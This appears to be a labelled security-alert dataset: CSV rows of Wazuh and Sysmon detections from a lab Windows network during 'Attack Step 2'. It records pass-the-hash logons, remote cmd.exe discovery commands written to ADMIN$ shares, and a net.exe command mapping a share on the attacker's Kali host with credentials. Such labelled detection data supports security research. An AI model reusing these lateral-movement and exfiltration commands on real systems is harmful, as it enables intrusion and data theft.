4226,Attack Step 2,"May 9, 2025 @ 15:31:30.826",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4227,Attack Step 2,"May 9, 2025 @ 15:31:30.829",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4228,Attack Step 2,"May 9, 2025 @ 15:31:30.873",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4229,Attack Step 2,"May 9, 2025 @ 15:31:30.881",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4230,Attack Step 2,"May 9, 2025 @ 15:31:30.938",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4231,Attack Step 2,"May 9, 2025 @ 15:31:30.966",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4232,Attack Step 2,"May 9, 2025 @ 15:31:31.000",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4233,Attack Step 2,"May 9, 2025 @ 15:31:31.043",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4234,Attack Step 2,"May 9, 2025 @ 15:31:31.044",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4235,Attack Step 2,"May 9, 2025 @ 15:31:31.082",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4236,Attack Step 2,"May 9, 2025 @ 15:31:31.111",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4237,Attack Step 2,"May 9, 2025 @ 15:31:31.137",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4238,Attack Step 2,"May 9, 2025 @ 15:31:31.576",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\System32\\SearchFilterHost.exe\"" 892 2608 2784 872 {5E941D80-BF96-11CD-B579-08002B30BFEB}",,3,67027,A process was created.,,,
4239,Attack Step 2,"May 9, 2025 @ 15:31:41.071",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,taskhostw.exe,,3,67027,A process was created.,,,
4240,Attack Step 2,"May 9, 2025 @ 15:31:42.263",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\sppsvc.exe,,3,67027,A process was created.,,,
4241,Attack Step 2,"May 9, 2025 @ 15:31:43.650",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4242,Attack Step 2,"May 9, 2025 @ 15:31:43.666",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wsappx -p,,3,67027,A process was created.,,,
4243,Attack Step 2,"May 9, 2025 @ 15:31:47.655",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\uus\\packages\\preview\\AMD64\\MoUsoCoreWorker.exe\"" useprivatenamespaces",,3,67027,A process was created.,,,
4244,Attack Step 2,"May 9, 2025 @ 15:31:47.672",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4245,Attack Step 2,"May 9, 2025 @ 15:31:47.691",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wusvcs -p,,3,67027,A process was created.,,,
4246,Attack Step 2,"May 9, 2025 @ 15:31:48.124",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4247,Attack Step 2,"May 9, 2025 @ 15:31:48.135",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4248,Attack Step 2,"May 9, 2025 @ 15:32:14.141",16,10.12.25.5,Windows11EWS,Application,16384,3132,,,,,,,,,,,3,60642,Software protection service scheduled successfully.,,,
4249,Attack Step 2,"May 9, 2025 @ 15:32:17.064",15,10.12.25.3,Windows11,System,7040,844,,,,,,,,,,,3,61104,Service startup type was changed,,,
4250,Attack Step 2,"May 9, 2025 @ 15:33:12.335",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4251,Attack Step 2,"May 9, 2025 @ 15:33:12.345",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4252,Attack Step 2,"May 9, 2025 @ 15:33:31.504",0,,wazuhVM,,,,,,,,,,,,,,4,11,,,,
4253,Attack Step 2,"May 9, 2025 @ 15:35:22.360",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4254,Attack Step 2,"May 9, 2025 @ 15:35:22.361",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4255,Attack Step 2,"May 9, 2025 @ 15:35:22.386",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4256,Attack Step 2,"May 9, 2025 @ 15:35:22.386",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4257,Attack Step 2,"May 9, 2025 @ 15:35:22.411",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4258,Attack Step 2,"May 9, 2025 @ 15:35:22.411",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4259,Attack Step 2,"May 9, 2025 @ 15:35:22.441",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4260,Attack Step 2,"May 9, 2025 @ 15:35:22.441",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4261,Attack Step 2,"May 9, 2025 @ 15:35:22.479",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4262,Attack Step 2,"May 9, 2025 @ 15:35:22.479",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4263,Attack Step 2,"May 9, 2025 @ 15:35:22.481",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding,,3,67027,A process was created.,,,
4264,Attack Step 2,"May 9, 2025 @ 15:35:22.527",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,cmd.exe /Q /c cd \\ 1&gt; \\\\127.0.0.1\\ADMIN$\\__1746801317.6653054 2&gt;&amp;1,,3,67027,A process was created.,,,
4265,Attack Step 2,"May 9, 2025 @ 15:35:22.543",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4266,Attack Step 2,"May 9, 2025 @ 15:35:24.638",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,cmd.exe /Q /c cd  1&gt; \\\\127.0.0.1\\ADMIN$\\__1746801317.6653054 2&gt;&amp;1,,3,67027,A process was created.,,,
4267,Attack Step 2,"May 9, 2025 @ 15:35:24.644",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4268,Attack Step 2,"May 9, 2025 @ 15:35:34.654",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,cmd.exe /Q /c whoami 1&gt; \\\\127.0.0.1\\ADMIN$\\__1746801317.6653054 2&gt;&amp;1,,3,67027,A process was created.,,,
4269,Attack Step 2,"May 9, 2025 @ 15:35:34.655",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,1,3088,,,,,,,Windows11\\Windows11,cmd.exe /Q /c whoami 1&gt; \\\\127.0.0.1\\ADMIN$\\__1746801317.6653054 2&gt;&amp;1,whoami,,3,92032,Suspicious Windows cmd shell execution,[T1087 T1059.003],"[Discovery, Execution]","[Account Discovery, Windows Command Shell]"
4270,Attack Step 2,"May 9, 2025 @ 15:35:34.680",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4271,Attack Step 2,"May 9, 2025 @ 15:35:34.886",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,whoami,,3,67027,A process was created.,,,
4272,Attack Step 2,"May 9, 2025 @ 15:35:42.655",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,cmd.exe /Q /c whoami /priv 1&gt; \\\\127.0.0.1\\ADMIN$\\__1746801317.6653054 2&gt;&amp;1,,3,67027,A process was created.,,,
4273,Attack Step 2,"May 9, 2025 @ 15:35:42.661",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4274,Attack Step 2,"May 9, 2025 @ 15:35:42.674",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,1,3088,,,,,,,Windows11\\Windows11,cmd.exe /Q /c whoami /priv 1&gt; \\\\127.0.0.1\\ADMIN$\\__1746801317.6653054 2&gt;&amp;1,whoami  /priv,,3,92032,Suspicious Windows cmd shell execution,[T1087 T1059.003],"[Discovery, Execution]","[Account Discovery, Windows Command Shell]"
4275,Attack Step 2,"May 9, 2025 @ 15:35:42.842",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,whoami  /priv,,3,67027,A process was created.,,,
4276,Attack Step 2,"May 9, 2025 @ 15:35:48.653",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,1,3088,,,,,,,Windows11\\Windows11,cmd.exe /Q /c arp -a 1&gt; \\\\127.0.0.1\\ADMIN$\\__1746801317.6653054 2&gt;&amp;1,arp  -a,,3,92032,Suspicious Windows cmd shell execution,[T1087 T1059.003],"[Discovery, Execution]","[Account Discovery, Windows Command Shell]"
4277,Attack Step 2,"May 9, 2025 @ 15:35:48.669",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,cmd.exe /Q /c arp -a 1&gt; \\\\127.0.0.1\\ADMIN$\\__1746801317.6653054 2&gt;&amp;1,,3,67027,A process was created.,,,
4278,Attack Step 2,"May 9, 2025 @ 15:35:48.701",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4279,Attack Step 2,"May 9, 2025 @ 15:35:48.913",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,arp  -a,,3,67027,A process was created.,,,
4280,Attack Step 2,"May 9, 2025 @ 15:36:10.564",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,cmd.exe /Q /c dir 1&gt; \\\\127.0.0.1\\ADMIN$\\__1746801317.6653054 2&gt;&amp;1,,3,67027,A process was created.,,,
4281,Attack Step 2,"May 9, 2025 @ 15:36:10.576",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4282,Attack Step 2,"May 9, 2025 @ 15:36:39.139",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,1,3088,,,,,,,Windows11\\Windows11,cmd.exe /Q /c ipconfig 1&gt; \\\\127.0.0.1\\ADMIN$\\__1746801317.6653054 2&gt;&amp;1,ipconfig,,3,92032,Suspicious Windows cmd shell execution,[T1087 T1059.003],"[Discovery, Execution]","[Account Discovery, Windows Command Shell]"
4283,Attack Step 2,"May 9, 2025 @ 15:36:39.187",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,cmd.exe /Q /c ipconfig 1&gt; \\\\127.0.0.1\\ADMIN$\\__1746801317.6653054 2&gt;&amp;1,,3,67027,A process was created.,,,
4284,Attack Step 2,"May 9, 2025 @ 15:36:39.266",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4285,Attack Step 2,"May 9, 2025 @ 15:36:39.508",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,ipconfig,,3,67027,A process was created.,,,
4286,Attack Step 2,"May 9, 2025 @ 15:36:57.674",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\rundll32.exe\"" C:\\WINDOWS\\system32\\PcaSvc.dll,PcaPatchSdbTask",,3,67027,A process was created.,,,
4287,Attack Step 2,"May 9, 2025 @ 15:37:39.950",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,taskhostw.exe,,3,67027,A process was created.,,,
4288,Attack Step 2,"May 9, 2025 @ 15:37:41.424",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\sppsvc.exe,,3,67027,A process was created.,,,
4289,Attack Step 2,"May 9, 2025 @ 15:38:10.984",15,10.12.25.3,Windows11,Application,16384,3496,,,,,,,,,,,3,60642,Software protection service scheduled successfully.,,,
4290,Attack Step 2,"May 9, 2025 @ 15:41:03.628",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4291,Attack Step 2,"May 9, 2025 @ 15:41:03.635",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4292,Attack Step 2,"May 9, 2025 @ 15:41:12.010",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91816,Powershell script querying system environment variables,[T1082],[Discovery],[System Information Discovery]
4293,Attack Step 2,"May 9, 2025 @ 15:41:13.612",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding,,3,67027,A process was created.,,,
4294,Attack Step 2,"May 9, 2025 @ 15:41:13.628",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4295,Attack Step 2,"May 9, 2025 @ 15:41:14.546",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\servicing\\TrustedInstaller.exe,,3,67027,A process was created.,,,
4296,Attack Step 2,"May 9, 2025 @ 15:41:14.585",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.3764_none_a5067b2d776484b6\\TiWorker.exe -Embedding,,3,67027,A process was created.,,,
4297,Attack Step 2,"May 9, 2025 @ 15:41:28.489",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding,,3,67027,A process was created.,,,
4298,Attack Step 2,"May 9, 2025 @ 15:41:30.895",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -Embedding,,3,67027,A process was created.,,,
4299,Attack Step 2,"May 9, 2025 @ 15:41:32.209",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4300,Attack Step 2,"May 9, 2025 @ 15:41:32.242",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\msiexec.exe /V,,3,67027,A process was created.,,,
4301,Attack Step 2,"May 9, 2025 @ 15:41:33.552",15,10.12.25.3,Windows11,Application,1035,4588,,,,,,,,,,,3,60635,Windows installer reconfigured the product.,,,
4302,Attack Step 2,"May 9, 2025 @ 15:41:49.303",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91816,Powershell script querying system environment variables,[T1082],[Discovery],[System Information Discovery]
4303,Attack Step 2,"May 9, 2025 @ 15:42:15.014",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4304,Attack Step 2,"May 9, 2025 @ 15:42:15.015",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4305,Attack Step 2,"May 9, 2025 @ 15:42:15.116",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91816,Powershell script querying system environment variables,[T1082],[Discovery],[System Information Discovery]
4306,Attack Step 2,"May 9, 2025 @ 15:42:28.812",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -Embedding,,3,67027,A process was created.,,,
4307,Attack Step 2,"May 9, 2025 @ 15:44:20.053",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4308,Attack Step 2,"May 9, 2025 @ 15:44:20.059",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4309,Attack Step 2,"May 9, 2025 @ 15:44:20.153",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91816,Powershell script querying system environment variables,[T1082],[Discovery],[System Information Discovery]
4310,Attack Step 2,"May 9, 2025 @ 15:44:48.647",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91816,Powershell script querying system environment variables,[T1082],[Discovery],[System Information Discovery]
4311,Attack Step 2,"May 9, 2025 @ 15:44:48.995",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4312,Attack Step 2,"May 9, 2025 @ 15:44:49.040",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4313,Attack Step 2,"May 9, 2025 @ 15:45:53.773",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4314,Attack Step 2,"May 9, 2025 @ 15:45:53.785",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k GPSvcGroup,,3,67027,A process was created.,,,
4315,Attack Step 2,"May 9, 2025 @ 15:45:58.746",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4316,Attack Step 2,"May 9, 2025 @ 15:45:58.755",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4317,Attack Step 2,"May 9, 2025 @ 15:45:58.761",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\net.exe\"" use \\\\10.12.25.23\\MyShare /user:kali kali",,3,67027,A process was created.,,,
4318,Attack Step 2,"May 9, 2025 @ 15:45:58.836",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,1,3088,,,,,,,Windows11\\Windows11,C:\\WINDOWS\\system32\\wsmprovhost.exe -Embedding,"\""C:\\WINDOWS\\system32\\net.exe\"" use \\\\10.12.25.23\\MyShare /user:kali kali",,3,92037,A net.exe connection to a remote resource was started by C:\\Windows\\System32\\wsmprovhost.exe,[T1567],[Exfiltration],[Exfiltration Over Web Service]
4319,Attack Step 2,"May 9, 2025 @ 15:46:01.952",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,taskhostw.exe,,3,67027,A process was created.,,,
4320,Attack Step 2,"May 9, 2025 @ 15:46:01.962",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4321,Attack Step 2,"May 9, 2025 @ 15:46:01.976",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\BackgroundTaskHost.exe\"" -ServerName:BackgroundTaskHost.WebAccountProvider",,3,67027,A process was created.,,,
4322,Attack Step 2,"May 9, 2025 @ 15:46:01.989",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding,,3,67027,A process was created.,,,
4323,Attack Step 2,"May 9, 2025 @ 15:46:04.331",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\sppsvc.exe,,3,67027,A process was created.,,,
4324,Attack Step 2,"May 9, 2025 @ 15:46:25.554",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4325,Attack Step 2,"May 9, 2025 @ 15:46:25.562",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4326,Attack Step 2,"May 9, 2025 @ 15:46:25.610",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91816,Powershell script querying system environment variables,[T1082],[Discovery],[System Information Discovery]
4327,Attack Step 2,"May 9, 2025 @ 15:46:33.936",15,10.12.25.3,Windows11,Application,16384,6472,,,,,,,,,,,3,60642,Software protection service scheduled successfully.,,,
4328,Attack Step 2,"May 9, 2025 @ 15:47:34.906",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4329,Attack Step 2,"May 9, 2025 @ 15:47:34.906",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4330,Attack Step 2,"May 9, 2025 @ 15:47:34.907",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91816,Powershell script querying system environment variables,[T1082],[Discovery],[System Information Discovery]
4331,Attack Step 2,"May 9, 2025 @ 15:47:35.360",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91816,Powershell script querying system environment variables,[T1082],[Discovery],[System Information Discovery]
4332,Attack Step 2,"May 9, 2025 @ 15:47:35.633",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91816,Powershell script querying system environment variables,[T1082],[Discovery],[System Information Discovery]
4333,Attack Step 2,"May 9, 2025 @ 15:47:35.860",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91816,Powershell script querying system environment variables,[T1082],[Discovery],[System Information Discovery]
4334,Attack Step 2,"May 9, 2025 @ 15:47:35.915",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91816,Powershell script querying system environment variables,[T1082],[Discovery],[System Information Discovery]
4335,Attack Step 2,"May 9, 2025 @ 15:47:43.067",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\usoclient.exe\"" StartScan",,3,67027,A process was created.,,,
4336,Attack Step 2,"May 9, 2025 @ 15:47:43.174",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\uus\\packages\\preview\\AMD64\\MoUsoCoreWorker.exe\"" useprivatenamespaces",,3,67027,A process was created.,,,
